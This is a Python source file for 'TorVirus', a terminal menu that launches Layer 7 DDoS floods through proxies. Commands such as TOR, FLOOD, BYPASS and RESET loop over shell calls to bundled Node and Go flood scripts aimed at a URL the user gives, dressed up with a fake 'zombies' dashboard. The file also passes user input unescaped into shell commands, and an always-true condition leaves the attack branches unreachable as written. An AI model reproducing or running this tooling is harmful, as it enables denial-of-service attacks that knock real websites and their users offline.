import os as o
import time as t
import sys as s
import random as r
import subprocess as sp

def pro(cr, tl, br_ln=30):
    fl_ln = int(br_ln * cr // tl)
    br = "█" * fl_ln + "-" * (br_ln - fl_ln)
    return f"[{br}] {cr}/{tl}"

def clr_csl():
    o.system("cls" if o.name == "nt" else "clear")

def load_prxs(file_path="bin/odd/.cache/proxy.txt"):
    try:
        with open(file_path, "r") as file:
            for line in file:
                proxy = line.strip()
                if proxy:
                    yield proxy
    except FileNotFoundError:
        o.system("touch bin/odd/.cache/proxy.txt &")
        s.exit(1)

def dis_ds():
    up_tm = int(t.time() - ses_srt)
    minutes, seconds = divmod(up_tm, 60)
    print(
        f"""
    🖥️  TorVirus DASHBOARD 🖥️
    | 🛰️  Bots Online: {bot_cnt}
    | ⏳ Uptime: {minutes}m {seconds}s
    | 📈 Success Rate: {r.randint(85, 99)}%
    | 🔗 Network Strength: {r.choice(["Strong", "Moderate", "Weak"])}
    | ⚠️  Threat Level: {r.choice(["🟢 Low", "🟡 Medium", "🔴 High"])}
    """
    )

def mat_eff(dr=3):
    start = t.time()
    while t.time() - start < dr:
        print("".join(r.choice("01 ") for _ in range(80)))
        t.sleep(0.1)

def wlc_msg(bot_cnt, session_time):
    title = "           🚨 WELCOME TO TORVIRUS 🚨"
    info = f"| 🔐 Zombies: {bot_cnt} | Session: {session_time:.2f}s | Tor ✅ |"
    clr_csl()
    mat_eff(2)
    clr_csl()
    print(f"{title}\n{info}\n")

def ds_mn():
    clr_csl()
    wlc_msg(bot_cnt, ses_dr())
    print(
        """
  _____      __   ___
 |_   _|__ _ \\ \\ / (_)_ _ _  _ ___
   | |/ _ \\ '_\\ V /| | '_| || (_-<
   |_|\\___/_|  \\_/ |_|_|  \\_,_/__/

    🚨  LAYER7 ATTACK METHODS MENU  🚨
         (Top-secret Protocols)

      !TOR - Launch TOR-based DDoS
    Usage: TOR https://example.com 60
"""
    )

def ld_ani(task, dr=1.5):
    frames = ["◐", "◓", "◑", "◒"]
    start = t.time()
    index = 0
    while t.time() - start < dr:
        print(f"\r{task} {frames[index % len(frames)]}", end="", flush=True)
        t.sleep(0.15)
        index += 1
    print("\r", end="")

def ani_txt(text, delay=0.05, end_line=True):
    for char in text:
        s.stdout.write(char)
        s.stdout.flush()
        t.sleep(delay)
    if end_line:
        print()

def ran_txt():
    msg_file_path = "lib/msg.txt"
    if o.path.isfile(msg_file_path):
        with open(msg_file_path, "r") as file:
            msg = [line.strip() for line in file if line.strip()]
    else:
        return
    slt_txt = r.choice(msg)
    ld_ani("Processing", 1.5)
    ani_txt(slt_txt)

def ses_dr():
    return t.time() - ses_srt

def mn_lp():
    ds_mn()
    while True:
        try:
            user_input = input("root@torvirus#~ ").strip()
            if not user_input:
                continue
            parts = user_input.split()
            cmd = parts[0].upper()

            if cmd == "STATS":
                clr_csl()
                dis_ds()
                continue

            elif cmd == "LAYER7" or "L7":
                ld_ani("✨ Loading Layer 7 Methods ✨", 1.5)
                print(
                    """
                         TOR  : TOR https://example.com 60
                         FLOOD: FLOOD https://example.com 60
                         HTTPX: HTTPX https://example.com 60
                         HTTPS: HTTPS https://example.com 60
                         RESET: RESET https://example.com 60
                         NOX  : NOX https://example.com 60"""
                )
                continue

            elif cmd in ["CLEAR", "CLS"]:
                ld_ani("Purging Console", 1.5)
                ds_mn()
                continue

            elif cmd == "EXIT":
                ld_ani("Exiting TorVirus", 1.5)
                ani_txt("👋 Goodbye, have a great day.", 0.02)
                t.sleep(1)
                s.exit(0)

            elif cmd in ["TOR", "FLOOD", "TLS", "NOX", "HTTPS", "BYPASS", "RESET"]:
                try:
                    tg = parts[1]
                    dr = int(parts[2])
                    mx_tm = 300
                    st_tm = t.time()

                    ani_txt(f"Engaging Attack on {tg} for {dr} seconds... 💥", 0.05)

                    while t.time() - st_tm < dr:
                        if cmd == "TOR":
                            rn_cmd(f'node bin/odd/.cache/TorXTor.js GET "{tg}" {mx_tm} 50 90 bin/odd/.cache/proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full')
                            rn_cmd(f'node bin/odd/.cache/TorXTor.js POST "{tg}" {mx_tm} 50 90 bin/odd/.cache/proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full')
                        elif cmd == "FLOOD":
                            rn_cmd(f'go run bin/odd/.cache/TorXHulk.go --site {tg} --data GET')
                            rn_cmd(f'go run bin/odd/.cache/TorXCrash.go {tg} 9999 get {mx_tm} nil')
                            rn_cmd(f'go run bin/odd/.cache/TorXHulk.go --site {tg} --data POST')
                            rn_cmd(f'go run bin/odd/.cache/TorXCrash.go {tg} 9999 POST {mx_tm} nil')
                        elif cmd == "TLS":
                            rn_cmd(f'node bin/odd/.cache/TorXTls.js {tg} {mx_tm} 90 20 bin/odd/.cache/proxy.txt')
                            rn_cmd(f'node bin/odd/.cache/TorXDark.js {tg} {mx_tm} 90 20 bin/odd/.cache/proxy.txt')
                        elif cmd == "NOX":
                            rn_cmd(f'node bin/odd/.cache/NOX.js {tg} {mx_tm} 20 90 bin/odd/.cache/proxy.txt')
                        elif cmd == "HTTPS":
                            rn_cmd(f'node bin/odd/.cache/HTTPS.js POST {tg} {mx_tm} 8 8 bin/odd/.cache/proxy.txt')
                            rn_cmd(f'node bin/odd/.cache/HTPPSV2.js GET {tg} {mx_tm} 8 8 bin/odd/.cache/proxy.txt')
                        elif cmd == "BYPASS":
                            rn_cmd(f'node bin/odd/.cache/TorXBypassV2.js {tg} {mx_tm} 90 20 bin/odd/.cache/proxy.txt')
                            rn_cmd(f'node bin/odd/.cache/TorXBypass.js {tg} {mx_tm} 90 20 bin/odd/.cache/proxy.txt')
                        elif cmd == "RESET":
                            rn_cmd(f'node bin/odd/.cache/RESETV2.js {tg} {mx_tm} 8 8 bin/odd/.cache/proxy.txt --full')
                            rn_cmd(f'node bin/odd/.cache/RESET.js {tg} {mx_tm} 8 8 bin/odd/.cache/proxy.txt')
                        t.sleep(1)

                except IndexError:
                    print("❌ Invalid Command. Usage: METHOD URL TIME")
                    print("Example: TOR https://example.com 60")

            elif cmd == "PROXY":
                rn_cmd("python3 bin/odd/.cache/scrape.py &")
                continue

            elif cmd == "UPDATE":
                rn_cmd("git reset --hard HEAD && git pull origin main")
                continue

            elif cmd == "SETUP":
                rn_cmd("sudo bash setup.sh &")
                continue

            elif cmd == "HELP":
                ld_ani("Loading Help", 1.5)
                print("📖 Available Commands: LAYER7, STATS, CLEAR, EXIT, HELP, UPDATE, SETUP")
                continue

            else:
                ani_txt("❓ Unknown Command. Try HELP.", 0.05)

        except KeyboardInterrupt:
            ani_txt("⚠️  Process Interrupted. Exiting...", 0.02)
            s.exit(0)

def rn_cmd(cmd):
    sp.run(cmd, shell=True)

ses_srt = t.time()
bot_cnt = sum(1 for _ in load_prxs())
mn_lp()